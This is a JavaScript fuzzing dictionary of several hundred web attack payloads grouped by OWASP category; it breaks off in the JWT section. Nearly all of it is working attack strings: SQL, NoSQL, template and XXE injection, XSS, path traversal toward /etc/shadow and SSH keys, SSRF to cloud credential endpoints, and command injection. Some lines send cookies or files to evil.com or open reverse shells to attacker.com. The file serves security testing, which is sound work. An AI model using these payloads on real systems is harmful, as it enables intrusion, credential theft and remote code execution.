/**
 * Categorized Fuzz Payload Dictionary — Comprehensive Edition
 * 
 * 700+ real-world payloads organized by OWASP vulnerability categories.
 * Sourced from: PayloadsAllTheThings, SecLists, FuzzDB, OWASP ZAP,
 * Wfuzz, HackTricks, PortSwigger Web Academy, and CVE exploit databases.
 *
 * References:
 *   - OWASP API Security Top 10 (2023)
 *   - OWASP Web Security Testing Guide v4.2 (WSTG)
 *   - Dharmaadi et al. (2025) "Fuzzing frameworks for server-side web applications"
 *   - Hammersland & Snekkenes (2008) "Fuzz testing of web applications"
 *   - Zhang et al. (2024) "Machine-learning based fuzzing techniques"
 *   - Ferech & Tvrdík (2023) "Efficient web service fuzzing"
 */

// ═══════════════════════════════════════════════════════════════
//  1. SQL Injection (70 payloads)
// ═══════════════════════════════════════════════════════════════
const SQL_INJECTION = [
    // ── Classic auth bypass ──
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR '1'='1'#",
    "\" OR \"1\"=\"1\"",
    "\" OR \"1\"=\"1\" --",
    "admin'--",
    "admin' #",
    "admin'/*",
    "' OR 1=1 --",
    "' OR 1=1#",
    "') OR ('1'='1",
    "') OR ('1'='1' --",
    "' OR ''='",
    "or 1=1",
    "or 1=1--",
    "' or 1=1/*",
    "1' or '1' = '1",
    "' OR 'x'='x",

    // ── Union-based ──
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL, NULL --",
    "' UNION SELECT NULL, NULL, NULL --",
    "' UNION SELECT 1,2,3 --",
    "' UNION SELECT username, password FROM users --",
    "' UNION SELECT table_name, NULL FROM information_schema.tables --",
    "' UNION SELECT column_name, NULL FROM information_schema.columns --",
    "' UNION ALL SELECT NULL, NULL, NULL --",
    "-1' UNION SELECT 1,2,3 --",
    "0 UNION SELECT NULL, NULL, NULL --",
    "' UNION SELECT @@version --",
    "' UNION SELECT user() --",
    "' UNION SELECT LOAD_FILE('/etc/passwd') --",

    // ── Error-based ──
    "' AND 1=1 --",
    "' AND 1=2 --",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version())) --",
    "' AND UPDATEXML(1,CONCAT(0x7e,version()),1) --",
    "1' AND 1=CONVERT(int,(SELECT @@version)) --",

    // ── Boolean-based blind ──
    "' AND SUBSTRING(version(),1,1)='5' --",
    "' AND (SELECT COUNT(*) FROM users) > 0 --",
    "' AND ASCII(SUBSTRING((SELECT database()),1,1)) > 64 --",
    "' AND LENGTH(database()) > 0 --",
    "' AND IF(1=1, 'true', 'false') --",

    // ── Time-based blind ──
    "'; WAITFOR DELAY '0:0:5' --",
    "' OR SLEEP(5) --",
    "1; SELECT pg_sleep(5) --",
    "1' AND SLEEP(5) --",
    "1' AND BENCHMARK(10000000,SHA1('test')) --",
    "'; SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END --",

    // ── Stacked queries ──
    "'; DROP TABLE users; --",
    "'; INSERT INTO users(username,password) VALUES('hacker','hacked'); --",
    "'; UPDATE users SET password='hacked' WHERE username='admin'; --",
    "'; EXEC xp_cmdshell('whoami'); --",
    "'; EXEC sp_configure 'show advanced options',1; --",

    // ── ORDER BY / GROUP BY ──
    "1' ORDER BY 1 --",
    "1' ORDER BY 100 --",
    "' HAVING 1=1 --",
    "' GROUP BY columnnames HAVING 1=1 --",

    // ── Filter evasion ──
    "' oR '1'='1",
    "' UnIoN SeLeCt NULL --",
    "'/**/OR/**/1=1/**/--",
    "' OR 1=1 -- -",
    "%27%20OR%201%3D1%20--",
    "' /*!50000OR*/ 1=1 --",
    "';%0aDROP%0aTABLE%0ausers;--",
    "' OR 1=1 LIMIT 1 OFFSET 0 --",
];

// ═══════════════════════════════════════════════════════════════
//  2. NoSQL Injection (40 payloads)
// ═══════════════════════════════════════════════════════════════
const NOSQL_INJECTION = [
    // ── MongoDB operator injection ──
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$ne": ""}',
    '{"$gt": 0}',
    '{"$gte": 0}',
    '{"$lt": 999999}',
    '{"$regex": ".*"}',
    '{"$regex": "^a"}',
    '{"$regex": "admin"}',
    '{"$exists": true}',
    '{"$exists": false}',
    '{$nin: []}',
    '{"$in": ["admin", "root", "test"]}',
    '{"$or": [{"a": 1}, {"b": 2}]}',

    // ── $where JavaScript injection ──
    '{"$where": "1==1"}',
    '{"$where": "this.password.match(/.*/)"}',
    '{"$where": "sleep(5000)"}',
    '{"$where": "function(){return true}"}',
    '{"$where": "this.a > this.b"}',
    "true, $where: '1 == 1'",

    // ── Query parameter pollution ──
    '[$ne]=1',
    '[$gt]=',
    '[$regex]=.*',
    '[$exists]=true',
    "[$ne]=null",

    // ── Prototype pollution via NoSQL ──
    '{"__proto__": {"isAdmin": true}}',
    '{"constructor": {"prototype": {"isAdmin": true}}}',
    '{"__proto__": {"role": "admin"}}',
    '{"$set": {"isAdmin": true}}',

    // ── MongoDB aggregation injection ──
    '{"$lookup": {"from": "users", "localField": "_id", "foreignField": "_id", "as": "leaked"}}',
    '[{"$match": {"password": {"$regex": ".*"}}}]',

    // ── Type juggling ──
    '{"$type": 2}',
    '{"$size": 0}',
    '{"$all": [true]}',

    // ── JavaScript code injection (MongoDB) ──
    "this.constructor.constructor('return process')().exit()",
    "db.users.find({}).toArray()",
    "'; return db.users.find({}).toArray(); var x='",
    '{"$comment": "test"}',

    // ── Encoded variants ──
    "%7B%22%24gt%22%3A%22%22%7D",
    '{"password[$ne]": ""}',
    '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
];

// ═══════════════════════════════════════════════════════════════
//  3. XSS — Cross-Site Scripting (80 payloads)
// ═══════════════════════════════════════════════════════════════
const XSS = [
    // ── Basic script tags ──
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<script src=http://evil.com/xss.js></script>",
    "<script>new Image().src='http://evil.com/?c='+document.cookie</script>",

    // ── Event handlers ──
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror='alert(1)'>",
    '<img src=x onerror="alert(1)">',
    "<img/src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<input onblur=alert(1) autofocus><input autofocus>",
    "<marquee onstart=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<math><maction actiontype=statusline xlink:href=javascript:alert(1)>click",
    "<isindex action=javascript:alert(1) type=image>",
    "<form action=javascript:alert(1)><input type=submit>",
    "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "<keygen onfocus=alert(1) autofocus>",
    "<button onfocus=alert(1) autofocus>",
    "<meter onmouseover=alert(1)>0</meter>",

    // ── JavaScript protocol ──
    "javascript:alert(1)",
    "javascript:alert(document.domain)",
    "JaVaScRiPt:alert(1)",
    "javascript:/*-->*/alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",

    // ── Attribute breakout ──
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "'><img src=x onerror=alert(1)>",
    "\" onfocus=alert(1) autofocus \"",
    "' onfocus=alert(1) autofocus '",
    "><svg onload=alert(1)>",
    "\"><svg/onload=alert(1)>",
    "onmouseover=alert(1)//",
    "\" onmouseover=\"alert(1)",

    // ── Tag breakout / injection ──
    "<a href='javascript:alert(1)'>click</a>",
    "<iframe src='javascript:alert(1)'>",
    "<iframe src=\"data:text/html,<script>alert(1)</script>\">",
    "<base href=javascript:alert(1)//",
    "<link rel=import href=data:text/html,<script>alert(1)</script>>",
    "<table background=javascript:alert(1)>",

    // ── DOM-based XSS ──
    "#<script>alert(1)</script>",
    "?param=<script>alert(1)</script>",
    "<img src=x onerror='fetch(\"http://evil.com?c=\"+document.cookie)'>",

    // ── Filter evasion ──
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<<script>alert(1)//<</script>",
    "<sCrIpT>alert(1)</sCrIpT>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
    "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
    "<script>alert`1`</script>",
    "<script>alert\\x281\\x29</script>",
    "<svg><script>alert&#40;1&#41;</script></svg>",

    // ── Template / framework XSS ──
    "{{constructor.constructor('alert(1)')()}}",
    "${alert(1)}",
    "{{7*7}}",
    "#{alert(1)}",
    "{{this.constructor.constructor('alert(1)')()}}",
    "${7*7}",
    "<%= 7*7 %>",
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",

    // ── Polyglot XSS (tests many contexts at once) ──
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )///%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    "'\"--></style></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'",
    "<img src=\"x\" onerror=\"&#x61;lert(1)\">",

    // ── SVG-based ──
    "<svg><animate onbegin=alert(1) attributeName=x>",
    "<svg><set onbegin=alert(1) attributeName=x>",

    // ── Mutation XSS (mXSS) ──
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    "<p style=\"animation:x\" onanimationstart=alert(1)>",
];

// ═══════════════════════════════════════════════════════════════
//  4. Command Injection / OS Injection (50 payloads)
// ═══════════════════════════════════════════════════════════════
const COMMAND_INJECTION = [
    // ── Linux separators ──
    "; ls -la",
    "; id",
    "; whoami",
    "; cat /etc/passwd",
    "; cat /etc/shadow",
    "; uname -a",
    "| cat /etc/passwd",
    "| id",
    "| whoami",
    "| ls -la /",
    "& whoami",
    "&& id",
    "&& cat /etc/passwd",
    "|| whoami",
    "|| cat /etc/shadow",

    // ── Subshell / backtick ──
    "$(whoami)",
    "$(id)",
    "$(cat /etc/passwd)",
    "$(sleep 5)",
    "`id`",
    "`whoami`",
    "`cat /etc/passwd`",
    "`sleep 5`",

    // ── Newline / null byte injection ──
    "\nid\n",
    "\nwhoami",
    "%0aid",
    "%0awhoami",
    "%0a%0d id",
    "a%00id",

    // ── Windows command injection ──
    "& dir",
    "| type C:\\Windows\\win.ini",
    "& net user",
    "& ipconfig /all",
    "& tasklist",
    "| ping -n 3 127.0.0.1",
    "& whoami /all",
    "| systeminfo",
    "%0a dir",

    // ── Blind / out-of-band ──
    "; ping -c 3 127.0.0.1",
    "; curl http://evil.com",
    "; wget http://evil.com",
    "; nslookup evil.com",
    "| nc -e /bin/sh attacker.com 4444",
    "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "$(curl http://evil.com/$(whoami))",

    // ── Filter evasion ──
    "'; exec('id'); //",
    "a]|id|[b",
    ";{cat,/etc/passwd}",
    "w]||[h]o[a]m[i",
    "$(printf '\\x69\\x64')",
    ";$IFS'id'",
];

// ═══════════════════════════════════════════════════════════════
//  5. Path Traversal / LFI / RFI (45 payloads)
// ═══════════════════════════════════════════════════════════════
const PATH_TRAVERSAL = [
    // ── Basic traversal ──
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\system32\\config\\sam",
    "..\\..\\..\\windows\\win.ini",

    // ── Double encoding ──
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",

    // ── Null byte (legacy PHP) ──
    "/etc/passwd%00",
    "/etc/passwd%00.jpg",
    "/etc/passwd%00.html",
    "....//....//etc/passwd%00",

    // ── Wrapper / scheme-based ──
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=string.rot13/resource=index.php",
    "php://input",
    "expect://id",
    "zip://path/to/file.zip#shell.php",
    "phar://path/to/file.phar/shell.php",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",

    // ── Sensitive Linux files ──
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/hostname",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/version",
    "/proc/net/tcp",
    "/var/log/auth.log",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "/root/.bash_history",
    "/root/.ssh/id_rsa",
    "/home/user/.ssh/authorized_keys",

    // ── Sensitive Windows files ──
    "C:\\boot.ini",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\Windows\\win.ini",
    "C:\\inetpub\\wwwroot\\web.config",
    "C:\\Windows\\System32\\config\\SAM",
];

// ═══════════════════════════════════════════════════════════════
//  6. SSRF — Server-Side Request Forgery (45 payloads)
// ═══════════════════════════════════════════════════════════════
const SSRF = [
    // ── IPv4 loopback variants ──
    "http://127.0.0.1",
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:6379",
    "http://127.0.0.1:27017",
    "http://localhost",
    "http://localhost:8080",
    "http://0.0.0.0",
    "http://0.0.0.0:80",

    // ── IPv6 loopback ──
    "http://[::1]",
    "http://[::1]:80",
    "http://[0000::1]",
    "http://[::ffff:127.0.0.1]",

    // ── Octal / hex / decimal IP encoding ──
    "http://0177.0.0.1",
    "http://0x7f000001",
    "http://2130706433",
    "http://017700000001",
    "http://0x7f.0x0.0x0.0x1",
    "http://127.1",
    "http://127.0.1",

    // ── Cloud metadata endpoints ──
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    "http://169.254.169.254/latest/meta-data/ami-id",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
    "http://100.100.100.200/latest/meta-data/",
    "http://169.254.170.2/v2/credentials",

    // ── DNS rebinding / private IPs ──
    "http://10.0.0.1",
    "http://172.16.0.1",
    "http://192.168.0.1",
    "http://192.168.1.1",

    // ── Protocol smuggling ──
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "dict://127.0.0.1:6379/INFO",
    "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall",
    "sftp://evil.com:11111/",
    "tftp://evil.com/file",
    "ldap://127.0.0.1:389/%0astats%0aquit",
    "jar:http://evil.com/evil.jar!/",

    // ── URL parser confusion ──
    "http://evil.com@127.0.0.1",
    "http://127.0.0.1#@evil.com",
    "http://127.0.0.1%00@evil.com",
    "http://127.1.1.1:80\\@127.2.2.2:80/",
];

// ═══════════════════════════════════════════════════════════════
//  7. SSTI — Server-Side Template Injection (35 payloads)
// ═══════════════════════════════════════════════════════════════
const TEMPLATE_INJECTION = [
    // ── Detection / identification ──
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    "*{7*7}",
    "@(1+2)",
    "{{7*'7'}}",
    "${7*'7'}",
    "{{foobar}}",
    "{{dump(app)}}",

    // ── Jinja2 (Python) ──
    "{{config}}",
    "{{config.items()}}",
    "{{settings.SECRET_KEY}}",
    "{{self.__class__.__mro__}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{% endfor %}",

    // ── Twig (PHP) ──
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    "{php}echo 'test';{/php}",

    // ── Freemarker (Java) ──
    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",

    // ── Pebble (Java) ──
    "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}",

    // ── Velocity (Java) ──
    "#set($x='')##$x=$x.class.forName('java.lang.Runtime').getRuntime().exec('id')",

    // ── EJS / Pug (Node.js) ──
    "{{constructor.constructor('return this')()}}",
    "{{this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}",
    "<%= global.process.mainModule.require('child_process').execSync('id') %>",
    "#{global.process.mainModule.require('child_process').execSync('id')}",

    // ── Handlebars ──
    "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",

    // ── Smarty (PHP) ──
    "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",

    // ── ERB (Ruby) ──
    "<%= system('id') %>",
    "<%= `id` %>",

    // ── Mako (Python) ──
    "${__import__('os').popen('id').read()}",
    "<%import os;os.popen('id').read()%>",
];

// ═══════════════════════════════════════════════════════════════
//  8. XXE — XML External Entity Injection (25 payloads)
// ═══════════════════════════════════════════════════════════════
const XXE = [
    // ── Basic file read ──
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',

    // ── SSRF via XXE ──
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22">]><foo>&xxe;</foo>',

    // ── Parameter entity (blind XXE) ──
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><foo>test</foo>',
    '<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://evil.com/?x=%file;\'>">%eval;%exfil;]>',

    // ── Billion laughs (DoS) ──
    '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>',

    // ── XInclude ──
    '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',

    // ── SVG-based XXE ──
    '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>',

    // ── SOAP XXE ──
    '<soap:Body><foo><![CDATA[<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><bar>&xxe;</bar>]]></foo></soap:Body>',

    // ── UTF-7 encoded ──
    '<?xml version="1.0" encoding="UTF-7"?>+ADw-!DOCTYPE foo +AFs-+ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-+ADw-foo+AD4-+ACY-xxe+ADs-+ADw-/foo+AD4-',

    // ── JSON to XML ──
    '{"foo": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">]><bar>&xxe;</bar>"}',

    // ── PHP stream wrappers ──
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',

    // ── Error-based XXE ──
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % error "<!ENTITY &#x25; leak SYSTEM \'file:///nonexistent/%file;\'>">%error;%leak;]><foo>test</foo>',

    // ── DOCTYPE in various positions ──
    '<!DOCTYPE foo SYSTEM "http://evil.com/xxe.dtd"><foo>test</foo>',
    '<?xml version="1.0"?><!DOCTYPE replace [<!ENTITY xxe "file content">]><foo>&xxe;</foo>',

    // ── OOB XXE via FTP ──
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "ftp://evil.com/xxe">%xxe;]><foo>test</foo>',

    // ── XLIFF ──
    '<xliff xmlns="urn:oasis:names:tc:xliff:document:1.2"><file><body><trans-unit><source><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>&xxe;</source></trans-unit></body></file></xliff>',

    // ── Minimal ──
    '<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
    '<?xml version="1.0"?><foo><!ENTITY xxe SYSTEM "file:///etc/passwd">&xxe;</foo>',
];

// ═══════════════════════════════════════════════════════════════
//  9. LDAP Injection (15 payloads)
// ═══════════════════════════════════════════════════════════════
const LDAP_INJECTION = [
    "*",
    "*)(&",
    "*)(|(&",
    "*()|%26'",
    "admin)(&)",
    "admin)(|(password=*))",
    "*(|(mail=*))",
    "*()|&'",
    "*)(cn=*))(|(cn=*",
    "*)(%26",
    "*(|(objectclass=*))",
    "admin)(!(&(1=0)))",
    "x)(|(uid=*))(|(uid=x",
    "admin)(|(cn=*))%00",
    "*))(|(objectClass=*",
];

// ═══════════════════════════════════════════════════════════════
//  10. Header Injection / CRLF (20 payloads)
// ═══════════════════════════════════════════════════════════════
const HEADER_INJECTION = [
    // ── Basic CRLF ──
    "test\r\nX-Injected: true",
    "test\r\n\r\n<html>injected</html>",
    "test%0d%0aX-Injected:%20true",
    "test%0d%0a%0d%0a<html>injected</html>",
    "test%0aX-Injected:%20true",
    "%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a",

    // ── Cookie injection ──
    "test\r\nSet-Cookie: malicious=true",
    "test%0d%0aSet-Cookie:%20malicious=true",
    "test\r\nSet-Cookie: session=hijacked; Path=/; HttpOnly",

    // ── Host header injection ──
    "test\nHost: evil.com",
    "test%0aHost:%20evil.com",
    "evil.com\r\nX-Forwarded-For: 127.0.0.1",

    // ── Content type injection ──
    "test\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>",

    // ── Response splitting ──
    "test\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html>injected</html>",
    "%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%3Chtml%3Einjected%3C/html%3E",

    // ── X-Forwarded-For spoofing ──
    "127.0.0.1\r\nX-Forwarded-For: 127.0.0.1",
    "test\r\nX-Forwarded-Host: evil.com",
    "test\r\nX-Original-URL: /admin",
    "test\r\nX-Rewrite-URL: /admin",
    "test\r\nTransfer-Encoding: chunked",
];

// ═══════════════════════════════════════════════════════════════
//  11. Prototype Pollution (20 payloads)
// ═══════════════════════════════════════════════════════════════
const PROTOTYPE_POLLUTION = [
    // ── Basic __proto__ ──
    '{"__proto__": {"isAdmin": true}}',
    '{"__proto__": {"role": "admin"}}',
    '{"__proto__": {"polluted": true}}',
    '{"__proto__": {"status": 200}}',
    '{"__proto__": {"verified": true}}',
    '{"__proto__": {"admin": true, "role": "superadmin"}}',
    '{"__proto__": {"toString": "polluted"}}',
    '{"__proto__": {"valueOf": "polluted"}}',

    // ── constructor.prototype ──
    '{"constructor": {"prototype": {"isAdmin": true}}}',
    '{"constructor": {"prototype": {"polluted": true}}}',
    '{"constructor": {"prototype": {"role": "admin"}}}',

    // ── Nested ──
    '{"a": {"__proto__": {"isAdmin": true}}}',
    '{"a": {"constructor": {"prototype": {"polluted": true}}}}',

    // ── Array-based ──
    '{"__proto__": [{"isAdmin": true}]}',

    // ── RCE via prototype pollution (Node.js) ──
    '{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require(\\"child_process\\").execSync(\\"id\\").toString())"}}',
    '{"__proto__": {"NODE_OPTIONS": "--require /proc/self/cmdline"}}',
    '{"__proto__": {"env": {"NODE_OPTIONS": "--require /proc/self/cmdline"}}}',

    // ── Encoded variants ──
    '{"__pro__to__": {"isAdmin": true}}',
    '{"\\u005f\\u005fproto\\u005f\\u005f": {"isAdmin": true}}',
    '{"constructor.prototype.isAdmin": true}',
];

// ═══════════════════════════════════════════════════════════════
//  12. Type Confusion / Mass Assignment (30 payloads)
// ═══════════════════════════════════════════════════════════════
const TYPE_CONFUSION = [
    // ── Numeric edge cases ──
    0,
    -0,
    -1,
    1,
    1.1,
    -1.1,
    0.1 + 0.2,
    999999999,
    -999999999,
    Number.MAX_SAFE_INTEGER,
    Number.MIN_SAFE_INTEGER,
    Number.MAX_VALUE,
    Number.MIN_VALUE,
    Number.EPSILON,
    NaN,
    Infinity,
    -Infinity,
    1e308,
    1e-308,
    0xDEADBEEF,
    0o777,

    // ── Type coercion ──
    null,
    undefined,
    true,
    false,
    [],
    {},
    [null],
    [undefined],
    [[]],
    [{}],
    "",
    "0",
    "1",
    "-1",
    "null",
    "undefined",
    "true",
    "false",
    "NaN",
    "Infinity",
    "[object Object]",
];

// ═══════════════════════════════════════════════════════════════
//  13. Buffer Overflow / Large Input / Format String (20 payloads)
// ═══════════════════════════════════════════════════════════════
const OVERFLOW = [
    "A".repeat(128),
    "A".repeat(256),
    "A".repeat(512),
    "A".repeat(1024),
    "A".repeat(4096),
    "A".repeat(8192),
    "A".repeat(65536),
    "0".repeat(256),
    "1".repeat(1024),

    // ── Format string ──
    "%s".repeat(50),
    "%x".repeat(50),
    "%n".repeat(50),
    "%d".repeat(50),
    "%p".repeat(50),
    "%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",

    // ── Null byte flood ──
    "\x00".repeat(100),
    "\x00".repeat(1000),

    // ── Unicode expansion ──
    "🔥".repeat(500),
    "💀".repeat(500),
    "\uFDFD".repeat(256),
];

// ═══════════════════════════════════════════════════════════════
//  14. Special Characters / Encoding (35 payloads)
// ═══════════════════════════════════════════════════════════════
const SPECIAL_CHARS = [
    // ── Empty / whitespace ──
    "",
    " ",
    "  ",
    "\t",
    "\n",
    "\r\n",
    "\r",
    "\v",
    "\f",
    " \t\n\r\v\f ",

    // ── Null / control characters ──
    "\0",
    "\x00",
    "\x01",
    "\x1f",
    "\x7f",
    "test\x00hidden",
    "%00",
    "test%00admin",

    // ── String type values ──
    "null",
    "undefined",
    "NaN",
    "true",
    "false",
    "None",
    "nil",

    // ── Quote / escape ──
    "'",
    "\"",
    "\\",
    "`",
    "\\\\",
    "\\'",
    "\\\"",

    // ── HTML / XML special ──
    "<>&\"'/",
    "&amp;&lt;&gt;&quot;&#39;",

    // ── Unicode edge cases ──
    "\uffff",
    "\ufffe",
    "\ud800",
    "\udbff",
    "\ufeff",
    "😀🔥💥🎯🧪",
    "¡™£¢∞§¶•ªº",
    "田中太郎",
    "𝕿𝖊𝖘𝖙",
    "مرحبا",
    "Привет",
    "🏳️‍🌈",

    // ── Right-to-left override ──
    "\u202E" + "test",
    "\u200B",
    "\u200D",
    "\uFEFF" + "test",

    // ── Very long unicode ──
    "Ω".repeat(256),
    "中".repeat(256),
];

// ═══════════════════════════════════════════════════════════════
//  15. Authentication / Authorization Bypass (30 payloads)
// ═══════════════════════════════════════════════════════════════
const AUTH_BYPASS = [
    // ── Common credentials ──
    "admin",
    "administrator",
    "root",
    "guest",
    "test",
    "user",
    "operator",
    "superadmin",
    "sa",
    "default",

    // ── Role / privilege escalation ──
    '{"role": "admin"}',
    '{"role": "superadmin"}',
    '{"role": "root"}',
    '{"isAdmin": true}',
    '{"admin": true}',
    '{"verified": true}',
    '{"active": true}',
    '{"permissions": ["*"]}',
    '{"access_level": 999}',

    // ── Token tampering ──
    "token=invalid",
    "Bearer null",
    "Bearer undefined",
    "Bearer ",
    "Bearer invalidtoken",
    "null",
    "undefined",
    "",
    "{{jwt_token}}",

    // ── JWT manipulation ──
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.",
